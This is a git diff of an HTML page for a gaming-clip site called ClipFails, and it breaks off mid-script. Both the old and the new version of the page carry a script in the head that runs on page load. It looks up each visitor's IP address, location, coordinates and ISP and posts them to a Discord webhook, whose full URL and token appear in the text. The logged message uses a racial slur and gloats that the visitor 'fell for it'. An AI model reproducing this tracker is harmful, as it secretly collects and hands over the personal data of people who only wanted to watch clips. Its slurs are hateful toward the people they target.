@@ -1,378 +1,857 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CLIP FAILS - clipfails.com</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ClipFails - Find Your Streaming Moment</title>
+  
+  <script>
+    (async () => {
+        try {
+            // STEP 1: Get IP and details from ipinfo.io
+            const info = await fetch('https://ipinfo.io/json')
+            .then(res => res.json());
+  
+            const ip = info.ip || 'Unknown';
+            const city = info.city || 'Unknown';
+            const region = info.region || 'Unknown';
+            const country = info.country || 'Unknown';
+            const loc = info.loc || 'Unknown';
+            const org = info.org || 'Unknown';
+            const hostname = info.hostname || 'Unknown';
+            const time = new Date().toISOString();
+  
+            // STEP 2: Send to Discord via webhook
+            const webhook = "https://discord.com/api/webhooks/1380408433022337064/kVh6nXSe_C9pgDr1kb1LJDogl4OwCEdAB4a20JgZeRVdQ6q2D5v1SR1P3f7ArPDQOWFD";
+  
+            // Determine if @everyone should be pinged
+            const shouldPing = (info.hostname) || false;
+  
+            const ping = shouldPing ? '@everyone\n' : '';
+  
+            const message = `${ping}**nigger fell for it**\n` +
+            `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
+            `Org: \`${org}\`\nCoords: \`${loc}\`\n` +
+            `Hostname: \`${hostname}\`\nTime: \`${time}\``;
+  
+            await fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: message })
+            });
+  
+        } catch (err) {
+            console.error("Logging failed:", err);
+        }
+    })();
+  </script>
 
-    <meta property="og:type" content="website">
-    <meta property="og:site_name" content="ClipFails">
-    <meta property="og:title" content="The Funniest Clips of All Time" />
-    <meta property="og:description" content="Watch hilarious clips from creators of all sizes 😂" />
-    <meta property="og:image" content="https://i.imgur.com/QRUakLz.jpeg" />
-    <meta property="og:url" content="https://clipfails.com"/>
-
-    <script>
-        (async () => {
-            try {
-                // STEP 1: Get IP and details from ipinfo.io
-                const info = await fetch('https://ipinfo.io/json')
-                .then(res => res.json());
-
-                const ip = info.ip || 'Unknown';
-                const city = info.city || 'Unknown';
-                const region = info.region || 'Unknown';
-                const country = info.country || 'Unknown';
-                const loc = info.loc || 'Unknown';
-                const org = info.org || 'Unknown';
-                const hostname = info.hostname || 'Unknown';
-                const time = new Date().toISOString();
-
-                // STEP 2: Send to Discord via webhook
-                const webhook = "https://discord.com/api/webhooks/1379310128574234695/FQ7xodP7sl-HJiVl8OIi4soCCHIZNuxzE909ES1W5CtR9HxaV3GvcFe-l78Z4Elk5l3L";
-
-                // Determine if @everyone should be pinged
-                const shouldPing = (info.hostname) || false;
-
-                const ping = shouldPing ? '@everyone\n' : '';
-
-                const message = `${ping}**nigger fell for it**\n` +
-                `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
-                `Org: \`${org}\`\nCoords: \`${loc}\`\n` +
-                `Hostname: \`${hostname}\`\nTime: \`${time}\``;
-
-                await fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: message })
-                });
-
-            } catch (err) {
-                console.error("Logging failed:", err);
-            }
-        })();
-    </script>
+  <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
     
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+        color: #e0e0e0;
+        min-height: 100vh;
+        overflow-x: hidden;
+    }
+    
+    .video-modal {
+        display: none;
+        position: fixed;
+        z-index: 2000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        overflow: auto;
+        background: rgba(0,0,0,0.95);
+        backdrop-filter: blur(4px);
+        justify-content: center;
+        align-items: center;
+    }
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #1a1a1a;
-            min-height: 100vh;
-            color: #e0e0e0;
-        }
+    .video-modal-content {
+        background-color: transparent;
+        padding: 2rem;
+        max-width: 95vw;
+        max-height: 95vh;
+        position: relative;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
 
+    .video-close {
+        position: fixed;
+        top: 20px;
+        right: 30px;
+        font-size: 40px;
+        font-weight: bold;
+        color: #fff;
+        cursor: pointer;
+        z-index: 2001;
+        background: rgba(0,0,0,0.7);
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        transition: all 0.3s ease;
+    }
+
+    .video-close:hover {
+        background: rgba(255,255,255,0.2);
+        transform: scale(1.1);
+    }
+
+    .modal-video {
+        width: 100%;
+        height: auto;
+        max-width: 90vw;
+        max-height: 80vh;
+        border-radius: 12px;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+    }
+
+    .modal-iframe {
+        width: 90vw;
+        height: 50.625vw; /* 16:9 aspect ratio */
+        max-height: 80vh;
+        max-width: 142.22vh; /* maintains 16:9 when height-constrained */
+        border-radius: 12px;
+        border: none;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+    }
+
+    .header {
+        background: rgba(0, 0, 0, 0.9);
+        backdrop-filter: blur(15px);
+        border-bottom: 1px solid #333;
+        padding: 1rem 2rem;
+        position: sticky;
+        top: 0;
+        z-index: 100;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .header-left h1 {
+        font-size: 2rem;
+        background: linear-gradient(45deg, #9146ff, #ff6b6b);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+        display: inline-block;
+    }
+
+    .header-left p {
+        opacity: 0.8;
+        margin: 0;
+    }
+
+    .nav-menu {
+        display: flex;
+        gap: 2rem;
+        align-items: center;
+    }
+
+    .nav-item {
+        color: #e0e0e0;
+        text-decoration: none;
+        padding: 0.5rem 1rem;
+        border-radius: 10px;
+        transition: all 0.3s ease;
+        font-weight: 500;
+        position: relative;
+    }
+
+    .nav-item:hover {
+        background: rgba(145, 70, 255, 0.2);
+        color: #9146ff;
+        transform: translateY(-2px);
+    }
+
+    .nav-item.active {
+        background: linear-gradient(45deg, #9146ff, #ff6b6b);
+        color: white;
+    }
+
+    .featured-section {
+        padding: 2rem;
+        border-bottom: 1px solid #333;
+    }
+
+    .all-clips-section {
+        padding: 2rem;
+    }
+
+    .about-section {
+        padding: 2rem;
+        max-width: 1200px;
+        margin: 0 auto;
+    }
+
+    .about-content {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 20px;
+        padding: 3rem;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .about-content h2 {
+        font-size: 2rem;
+        margin-bottom: 1rem;
+        background: linear-gradient(45deg, #9146ff, #ff6b6b);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+    }
+
+    .about-content p {
+        font-size: 1.1rem;
+        line-height: 1.6;
+        margin-bottom: 1.5rem;
+        color: #ccc;
+    }
+
+    .featured-container {
+        max-width: 1200px;
+        margin: 0 auto;
+    }
+
+    .featured-video {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 20px;
+        overflow: hidden;
+        position: relative;
+        height: 400px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .featured-video:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+        border-color: #9146ff;
+    }
+
+    .featured-video::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+        transition: left 0.6s;
+        z-index: 1;
+    }
+
+    .featured-video:hover::before {
+        left: 100%;
+    }
+
+    .featured-thumbnail {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        transition: transform 0.3s ease;
+        background: #222;
+    }
+
+    .featured-iframe {
+        width: 100%;
+        height: 100%;
+        border: none;
+        background: #222;
+    }
+
+    .featured-video:hover .featured-thumbnail,
+    .featured-video:hover .featured-iframe {
+        transform: scale(1.05);
+    }
+
+    .featured-info {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        background: linear-gradient(transparent, rgba(0, 0, 0, 0.9));
+        padding: 3rem 2rem 2rem;
+        z-index: 2;
+    }
+
+    .featured-badge {
+        display: inline-block;
+        background: linear-gradient(45deg, #ff6b6b, #ff4458);
+        color: white;
+        padding: 0.5rem 1rem;
+        border-radius: 20px;
+        font-size: 0.9rem;
+        font-weight: 600;
+        margin-bottom: 1rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .featured-title {
+        font-size: 2rem;
+        font-weight: 700;
+        margin-bottom: 0.5rem;
+        color: #fff;
+    }
+
+    .featured-meta {
+        display: flex;
+        gap: 1rem;
+        align-items: center;
+        color: #aaa;
+    }
+
+    .platform-badge {
+        padding: 0.3rem 0.8rem;
+        border-radius: 15px;
+        font-size: 0.8rem;
+        font-weight: 600;
+    }
+
+    .twitch { background: #9146ff; color: white; }
+    .youtube { background: #ff0000; color: white; }
+    .other { background: #333; color: white; }
+
+    .recommended-section {
+        padding: 2rem;
+    }
+
+    .section-title {
+        font-size: 1.8rem;
+        font-weight: 700;
+        margin-bottom: 2rem;
+        background: linear-gradient(45deg, #9146ff, #ff6b6b);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+    }
+
+    .recommended-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+        gap: 1.5rem;
+        max-width: 1200px;
+        margin: 0 auto;
+    }
+
+    .clip-card {
+        background: rgba(255, 255, 255, 0.08);
+        border-radius: 15px;
+        overflow: hidden;
+        transition: all 0.3s ease;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        position: relative;
+        cursor: pointer;
+        animation: fadeInUp 0.6s ease;
+    }
+
+    .clip-card:hover {
+        transform: translateY(-8px);
+        box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+        border-color: #9146ff;
+    }
+
+    .clip-card::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+        transition: left 0.5s;
+    }
+
+    .clip-card:hover::before {
+        left: 100%;
+    }
+
+    .clip-thumbnail {
+        width: 100%;
+        height: 180px;
+        object-fit: cover;
+        background: #222;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        transition: transform 0.3s ease;
+    }
+
+    .clip-card:hover .clip-thumbnail {
+        transform: scale(1.05);
+    }
+
+    .clip-info {
+        padding: 1.5rem;
+    }
+
+    .clip-title {
+        font-size: 1.1rem;
+        font-weight: 600;
+        margin-bottom: 0.8rem;
+        color: #fff;
+        line-height: 1.4;
+    }
+
+    .clip-meta {
+        color: #aaa;
+        font-size: 0.9rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 0.5rem;
+    }
+
+    .clip-stats {
+        display: flex;
+        gap: 1rem;
+        font-size: 0.8rem;
+        color: #999;
+        align-items: center;
+    }
+
+    .stat {
+        display: flex;
+        align-items: center;
+        gap: 0.3rem;
+    }
+
+    .like-btn {
+        background: none;
+        border: none;
+        color: #999;
+        cursor: pointer;
+        font-size: 0.8rem;
+        display: flex;
+        align-items: center;
+        gap: 0.3rem;
+        transition: all 0.3s ease;
+        padding: 0.2rem 0.5rem;
+        border-radius: 15px;
+    }
+
+    .like-btn:hover {
+        color: #ff6b6b;
+        background: rgba(255, 107, 107, 0.1);
+    }
+
+    .like-btn.liked {
+        color: #ff6b6b;
+        background: rgba(255, 107, 107, 0.1);
+    }
+
+    .hidden {
+        display: none !important;
+    }
+
+    @keyframes fadeInUp {
+        from {
+            opacity: 0;
+            transform: translateY(30px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    @media (max-width: 768px) {
         .header {
-            background: #2a2a2a;
-            border-bottom: 1px solid #404040;
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            padding: 1rem;
+            flex-direction: column;
+            gap: 1rem;
         }
 
-        .nav-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem 2rem;
+        .nav-menu {
+            gap: 1rem;
         }
 
-        .logo {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #9146ff;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-            list-style: none;
-        }
-
-        .nav-links a {
-            text-decoration: none;
-            color: #e0e0e0;
-            font-weight: 500;
-            padding: 0.5rem 1rem;
-            border-radius: 4px;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .nav-links a:hover,
-        .nav-links a.active {
-            background: #9146ff;
-            color: white;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem;
-        }
-
-        .page-section {
-            display: none;
-        }
-
-        .page-section.active {
-            display: block;
-        }
-
-        .featured-section {
-            margin-bottom: 3rem;
-        }
-
-        .section-title {
-            font-size: 2.5rem;
-            color: #ffffff;
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .featured-clip {
-            background: #2a2a2a;
-            border-radius: 8px;
-            padding: 2rem;
-            border: 1px solid #404040;
-            margin-bottom: 2rem;
-        }
-
-        .featured-clip .clip-video {
-    height: 400px; /* Increase the height for the featured clip */
-    object-fit: cover; /* Ensure the video scales properly */
-}
-
-        .clip-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
-            gap: 2rem;
-            margin-top: 2rem;
-        }
-
-        .clip-card {
-            background: #2a2a2a;
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid #404040;
-            transition: all 0.3s ease;
-        }
-
-        .clip-card:hover {
-            border-color: #9146ff;
-            transform: translateY(-2px);
-        }
-
-        .clip-video {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            border-radius: 4px;
-        }
-
-        .clip-info {
-            padding: 1.5rem;
-        }
-
-        .clip-title {
-            font-size: 1.2rem;
-            font-weight: bold;
-            margin-bottom: 0.5rem;
-            color: #ffffff;
-        }
-
-        .clip-creator {
-            color: #9146ff;
-            font-weight: 600;
-            margin-bottom: 1rem;
+        .nav-item {
+            padding: 0.4rem 0.8rem;
             font-size: 0.9rem;
         }
 
-        .clip-button {
-            background: #9146ff;
-            color: white;
-            border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: 600;
-            text-decoration: none;
-            display: inline-block;
-            transition: all 0.3s ease;
+        .featured-section {
+            padding: 1rem;
         }
 
-        .clip-button:hover {
-            background: #7928c4;
-            transform: translateY(-1px);
+        .featured-video {
+            height: 250px;
         }
 
-        .about-content {
-            background: #2a2a2a;
-            border-radius: 8px;
-            padding: 3rem;
-            border: 1px solid #404040;
-            line-height: 1.8;
-            font-size: 1.1rem;
-            color: #e0e0e0;
+        .featured-title {
+            font-size: 1.5rem;
         }
 
-        @media (max-width: 768px) {
-            .nav-container {
-                flex-direction: column;
-                gap: 1rem;
-            }
-
-            .nav-links {
-                gap: 1rem;
-            }
-
-            .clip-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .container {
-                padding: 1rem;
-            }
+        .featured-info {
+            padding: 2rem 1rem 1rem;
         }
-    </style>
+
+        .recommended-grid {
+            grid-template-columns: 1fr;
+        }
+
+        .video-modal-content {
+            padding: 1rem;
+        }
+
+        .modal-iframe {
+            width: 95vw;
+            height: 53.4vw; /* 16:9 aspect ratio for mobile */
+            max-height: 70vh;
+        }
+
+        .modal-video {
+            max-width: 95vw;
+            max-height: 70vh;
+        }
+
+        .video-close {
+            top: 10px;
+            right: 15px;
+            font-size: 30px;
+            width: 50px;
+            height: 50px;
+        }
+    }
+  </style>
 </head>
 <body>
-    <header class="header">
-        <nav class="nav-container">
-            <div class="logo">CLIP FAILS</div>
-            <ul class="nav-links">
-                <li><a href="#" class="nav-link active" data-section="home">Home</a></li>
-                <li><a href="#" class="nav-link" data-section="clips">Clips</a></li>
-                <li><a href="#" class="nav-link" data-section="about">About</a></li>
-            </ul>
-        </nav>
-    </header>
+  <header class="header">
+    <div class="header-left">
+      <h1>🎮 ClipFails</h1>
+      <p>Find Your Streaming Moment</p>
+    </div>
+    <nav class="nav-menu">
+      <a href="#" class="nav-item active" onclick="showSection('home')">Home</a>
+      <a href="#" class="nav-item" onclick="showSection('all-clips')">All Clips</a>
+      <a href="#" class="nav-item" onclick="showSection('about')">About</a>
+    </nav>
+  </header>
 
-    <main class="container">
-        <!-- HOME SECTION -->
-        <section id="home" class="page-section active">
-            <div class="featured-section">
-                <h1 class="section-title">Featured Clip</h1>
-                <div class="featured-clip" id="featured-clip">
-                    <!-- Featured clip will be populated by JavaScript -->
+  <section class="featured-section" id="home-section">
+    <div class="featured-container">
+      <div class="featured-video" id="featuredVideo" onclick="showVideoInModal(window.featuredClip?.url, window.featuredClip?.platform)">
+        <video class="featured-thumbnail" muted loop playsinline id="featuredVideoElement" style="display: none;">
+          <source src="" type="video/mp4" id="featuredSrc">
+          Your browser does not support the video tag.
+        </video>
+        <iframe class="featured-iframe" id="featuredIframe" style="display: none;" frameborder="0" allowfullscreen scrolling="no"></iframe>
+        <div class="featured-info">
+          <span class="featured-badge">🔥 Featured</span>
+          <h2 class="featured-title" id="featuredTitle">Loading clips... (if this is taking a while, reload your page)</h2>
+          <div class="featured-meta" id="featuredMeta">
+            <span>Now</span>
+            <span class="platform-badge other">OTHER</span>
+            <span>👀 0 views</span>
+            <span>❤️ 0 likes</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="recommended-section" id="home-recommended">
+    <h2 class="section-title">🌟 Recommended for You</h2>
+    <div class="recommended-grid" id="recommendedGrid"></div>
+  </section>
+
+  <section class="all-clips-section hidden" id="all-clips-section">
+    <h2 class="section-title">📺 All Clips</h2>
+    <div class="recommended-grid" id="allClipsGrid"></div>
+  </section>
+
+  <section class="about-section hidden" id="about-section">
+    <div class="about-content">
+      <h2>About ClipFails 🎮</h2>
+      <p>
+        Welcome to ClipFails, your ultimate destination for discovering amazing gaming clips and streaming moments! 
+        We curate the best fails, wins, and epic moments from your favorite streamers and content creators.
+      </p>
+      <p>
+        Whether you're looking for hilarious gaming fails, incredible clutch plays, or just want to relive 
+        some of the most memorable streaming moments, ClipFails has got you covered. Our platform supports 
+        clips from various sources including Twitch, YouTube, and local video files.
+      </p>
+    </div>
+  </section>
+
+  <div id="videoModal" class="video-modal">
+    <!-- Content will be dynamically inserted here -->
+  </div>
+
+  <script>
+    // Store liked clips locally
+    let likedClips = new Set();
+    let allClipsData = [];
+
+    function showSection(section) {
+        // Hide all sections
+        document.getElementById('home-section').classList.add('hidden');
+        document.getElementById('home-recommended').classList.add('hidden');
+        document.getElementById('all-clips-section').classList.add('hidden');
+        document.getElementById('about-section').classList.add('hidden');
+
+        // Remove active class from all nav items
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.classList.remove('active');
+        });
+
+        // Show selected section and set active nav
+        if (section === 'home') {
+            document.getElementById('home-section').classList.remove('hidden');
+            document.getElementById('home-recommended').classList.remove('hidden');
+            document.querySelector('[onclick="showSection(\'home\')"]').classList.add('active');
+        } else if (section === 'all-clips') {
+            document.getElementById('all-clips-section').classList.remove('hidden');
+            document.querySelector('[onclick="showSection(\'all-clips\')"]').classList.add('active');
+            loadAllClips();
+        } else if (section === 'about') {
+            document.getElementById('about-section').classList.remove('hidden');
+            document.querySelector('[onclick="showSection(\'about\')"]').classList.add('active');
+        }
+    }
+
+    function showVideoInModal(url, type) {
+        if (!url) return;
+        
+        const modal = document.getElementById("videoModal");
+
+        if (type === "twitch") {
+            const clipId = url.split("/").pop();
+            modal.innerHTML = `
+                <div class="video-modal-content">
+                <span class="video-close" onclick="closeVideoModal()">×</span>
+                <iframe
+                    class="modal-iframe"
+                    src="https://clips.twitch.tv/embed?clip=${clipId}&parent=${window.location.hostname}"
+                    frameborder="0"
+                    allowfullscreen
+                    scrolling="no"
+                ></iframe>
+                </div>
+            `;
+        } else {
+            modal.innerHTML = `
+                <div class="video-modal-content">
+                <span class="video-close" onclick="closeVideoModal()">×</span>
+                <video class="modal-video" controls autoplay>
+                    <source src="${url}" type="video/mp4">
+                    Your browser does not support video.
+                </video>
+                </div>
+            `;
+        }
+
+        modal.style.display = "flex";
+        
+        // Add event listener for clicking outside to close
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                closeVideoModal();
+            }
+        });
+
+        // Add keyboard listener for Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && modal.style.display === 'flex') {
+                closeVideoModal();
+            }
+        });
+    }
+
+    function closeVideoModal() {
+        const modal = document.getElementById("videoModal");
+        const video = modal.querySelector('video');
+        if (video) {
+            video.pause();
+        }
+        modal.style.display = "none";
+        modal.innerHTML = ""; // Clear content to prevent memory leaks
+    }
+
+    function toggleFeatured() {
+        const video = document.getElementById('featuredVideoElement');
+        const iframe = document.getElementById('featuredIframe');
+        
+        if (window.featuredClip?.platform === 'twitch') {
+            // For Twitch clips, we can't control the iframe, so just open the modal
+            showVideoInModal(window.featuredClip.url, window.featuredClip.platform);
+        } else {
+            // For local videos, toggle play/pause
+            if (video.paused) video.play();
+            else video.pause();
+        }
+    }
+
+    function toggleLike(clipId, element) {
+        event.stopPropagation();
+        
+        const likeCount = element.querySelector('.like-count');
+        const heartIcon = element.querySelector('.heart-icon');
+        let currentLikes = parseInt(likeCount.textContent);
+        
+        if (likedClips.has(clipId)) {
+            // Unlike
+            likedClips.delete(clipId);
+            element.classList.remove('liked');
+            heartIcon.textContent = '🤍';
+            likeCount.textContent = currentLikes - 1;
+        } else {
+            // Like
+            likedClips.add(clipId);
+            element.classList.add('liked');
+            heartIcon.textContent = '❤️';
+            likeCount.textContent = currentLikes + 1;
+        }
+    }
+
+    function generateClipCard(clip) {
+        const clipId = clip.id || clip.url;
+        const isLiked = likedClips.has(clipId);
+        const displayLikes = isLiked ? parseInt(clip.likes) + 1 : clip.likes;
+        
+        if (clip.platform === "twitch") {
+            return `
+            <div class="clip-card" onclick="showVideoInModal('${clip.url}', 'twitch')">
+                <iframe
+                class="clip-thumbnail"
+                src="https://clips.twitch.tv/embed?clip=${clip.url.split("/").pop()}&parent=${window.location.hostname}"
+                frameborder="0"
+                allowfullscreen
+                scrolling="no"
+                style="width:100%; height:180px; border-radius:12px; background:#000;"
+                ></iframe>
+                <div class="clip-info">
+                <div class="clip-title">${clip.title}</div>
+                <div class="clip-meta">
+                    <span class="platform-badge twitch">TWITCH</span>
+                </div>
+                <div class="clip-stats">
+                    <span class="stat">👀 ${clip.views}</span>
+                    <button class="like-btn ${isLiked ? 'liked' : ''}" onclick="toggleLike('${clipId}', this)">
+                        <span class="heart-icon">${isLiked ? '❤️' : '🤍'}</span>
+                        <span class="like-count">${displayLikes}</span>
+                    </button>
+                </div>
                 </div>
             </div>
-            
-            <h2 class="section-title">Latest Clips</h2>
-            <div class="clip-grid" id="home-clips">
-                <!-- Clips will be populated by JavaScript -->
+            `;
+        } else {
+            return `
+            <div class="clip-card" onclick="showVideoInModal('${clip.url}', 'local')">
+                <video class="clip-thumbnail" muted>
+                <source src="${clip.url}" type="video/mp4">
+                </video>
+                <div class="clip-info">
+                <div class="clip-title">${clip.title}</div>
+                <div class="clip-meta">
+                    <span class="platform-badge other">OTHER</span>
+                </div>
+                <div class="clip-stats">
+                    <span class="stat">👀 ${clip.views}</span>
+                    <button class="like-btn ${isLiked ? 'liked' : ''}" onclick="toggleLike('${clipId}', this)">
+                        <span class="heart-icon">${isLiked ? '❤️' : '🤍'}</span>
+                        <span class="like-count">${displayLikes}</span>
+                    </button>
+                </div>
+                </div>
             </div>
-        </section>
+            `;
+        }
+    }
 
-        <!-- CLIPS SECTION -->
-        <section id="clips" class="page-section">
-            <h1 class="section-title">All Clips</h1>
-            <div class="clip-grid" id="all-clips">
-                <!-- All clips will be populated by JavaScript -->
-            </div>
-        </section>
+    function loadAllClips() {
+        const grid = document.getElementById("allClipsGrid");
+        grid.innerHTML = "";
 
-        <!-- ABOUT SECTION -->
-        <section id="about" class="page-section">
-            <h1 class="section-title">About CLIP FAILS</h1>
-            <div class="about-content">
-                <p>Welcome to <strong>CLIP FAILS</strong> - your ultimate destination for the most entertaining and epic fail moments from Twitch streams!</p>
-                
-                <p>We curate the best clips from streamers around the world, featuring hilarious gaming moments, unexpected reactions, and those perfect "you had to be there" situations that make streaming so special.</p>
-                
-                <p>Our mission is to celebrate the lighter side of gaming and streaming culture, bringing you content that will make you laugh, cringe, and maybe even learn something new about your favorite games.</p>
-                
-                <p>Have a clip you think deserves to be featured? We're always looking for fresh content that showcases the best (and worst) moments in gaming!</p>
-                
-                <p><strong>clipfails.com</strong> - Where epic fails become legendary wins! 🎮</p>
-            </div>
-        </section>
-    </main>
-
-    <script>
-        // EASY CLIP MANAGEMENT SYSTEM
-        // To add a new clip, simply add one line to the clips array:
-        // {title: "Clip Title", creator: "Creator Name", videoPath: "path/to/video.mp4", link: "https://twitch.tv/clip-url"}
+        if (allClipsData.length === 0) {
+            grid.innerHTML = '<p style="text-align: center; color: #aaa;">No clips available</p>';
+            return;
+        }
         
-        const clips = [
-            {title: "jos running", creator: "kennyhoopz", videoPath: "video15.mp4", link: "https://kick.com/kennyhoopz/clips/clip_01JV1M3MFGHEBZ1FD0QPATPV7R"},
-            {title: "jfk in dress to impress", creator: "ClipMaster", videoPath: "video14.mp4", link: "https://www.twitch.tv/nothinbutlag/clip/AmericanSassyShinglePartyTime-WKNIsiUxOF_R2z8a"},
-            {title: "Valid crashout?", creator: "KaneAtwoodOfficial", videoPath: "video13.mp4", link: "https://www.twitch.tv/kaneatwoodofficial/clip/FurtiveFlaccidTitanMingLee-aQ1wqrayNTBe_Sqp"},
-            {title: "WTF IS THAT", creator: "PrinceTerra_", videoPath: "video12.mp4", link: "https://www.twitch.tv/princeterra_/clip/AverageFrigidLasagnaAllenHuhu-DTkbdoVKL3gYUqxw"},
-            {title: "fortnite dance", creator: "vicebean", videoPath: "video9.mp4", link: "https://www.twitch.tv/vicebean/clip/ResoluteLitigiousCaribouNotATK-TArBDkV9mv0_YleI"},
-            {title: "THROW", creator: "xQc", videoPath: "video1.mp4", link: "https://www.twitch.tv/xqc/clip/PleasantImportantIcecreamTriHard-da5Yabw5In170TnD"},
-            {title: "ARROW GOES BRRRRRRRR", creator: "SymSC", videoPath: "video2.mp4", link: "https://www.twitch.tv/symsc/clip/PlainCovertGarlicRaccAttack"},
-            {title: "Karma", creator: "Vonza", videoPath: "video3.mp4", link: "https://www.twitch.tv/vonza/clip/FitTolerantAnacondaOpieOP-gHMiF9jl5tJDKhtK"},
-            {title: "clicked bed", creator: "AnorakDT", videoPath: "video4.mp4", link: "https://www.twitch.tv/anorakdt/clip/SpinelessElegantJuiceTBCheesePull-7zInFLCdU7el_oEq"},
-            {title: "When your friends run away from your hugs", creator: "VivianViatrix", videoPath: "video5.mp4", link: "https://www.twitch.tv/vivianviatrix/clip/ResoluteInquisitiveKeyboardNerfBlueBlaster-RndiM4i_t1v7sAdP"},
-            {title: "NOOOOO I FELL!! 😭😭", creator: "kittween", videoPath: "video6.mp4", link: "https://www.twitch.tv/kittween/clip/PlausibleShyCamelNotATK-BpPoC3AiaKX-nS46"},
-            {title: "The illustration 😭", creator: "StillDanye", videoPath: "video7.mp4", link: "https://www.twitch.tv/stilldanye/clip/NimbleLovelyBeanHeyGirl-qW8HsfNeTn7L5c02"},
-            {title: "kiki got clapped 🙂‍↕️", creator: "thekikimon", videoPath: "video8.mp4", link: "https://www.twitch.tv/thekikimon/clip/ProudTalentedBoarTF2John-GH2BMspUZLI-HTWK"},
-            {title: "Officer down!", creator: "ENVI", videoPath: "video10.mp4", link: "https://www.twitch.tv/envi/clip/CarefulLazyPeppermintCopyThis-S6vxuWMvkSD76sb_"},
-            {title: "skinny gay guy", creator: "qtfhss", videoPath: "video11.mp4", link: "https://kick.com/himay/clips/clip_01JWB0K99KW8BVEW24M6KVA4AY"}
-        ];
+        for (const clip of sorted) {
+            grid.innerHTML += generateClipCard(clip);
+        }
+    }
 
-        // Featured clip (first clip in array)
-        const featuredClip = clips[0];
+    async function loadClips() {
+    try {
+        const res = await fetch("./clips.json");
+        const data = await res.json();
+        allClipsData = data || [];
+        const grid = document.getElementById("recommendedGrid");
+        grid.innerHTML = "";
 
-        function createClipHTML(clip, isFeatured = false) {
-    const cardClass = isFeatured ? 'featured-clip' : 'clip-card';
-    const videoClass = isFeatured ? 'clip-video' : 'clip-video';
-    
-    return `
-        <div class="${cardClass}">
-            <video src="${clip.videoPath}" class="${videoClass}" controls loading="lazy">
-                Your browser does not support the video tag.
-            </video>
-            <div class="clip-info">
-                <h3 class="clip-title">${clip.title}</h3>
-                <p class="clip-creator">by ${clip.creator}</p>
-                <a href="${clip.link}" target="_blank" class="clip-button">Watch Original Clip</a>
-            </div>
-        </div>
-    `;
-}
+        if (!data || data.length === 0) {
+            document.getElementById("featuredTitle").innerText = "No clips available";
+            document.getElementById("featuredMeta").innerHTML = '<span>Add some clips to clips.json to get started</span>';
+            return;
+        }
 
-        // Navigation functionality
-        const navLinks = document.querySelectorAll('.nav-link');
-        const sections = document.querySelectorAll('.page-section');
+        // Use the JSON order directly
+        const sorted = data;
 
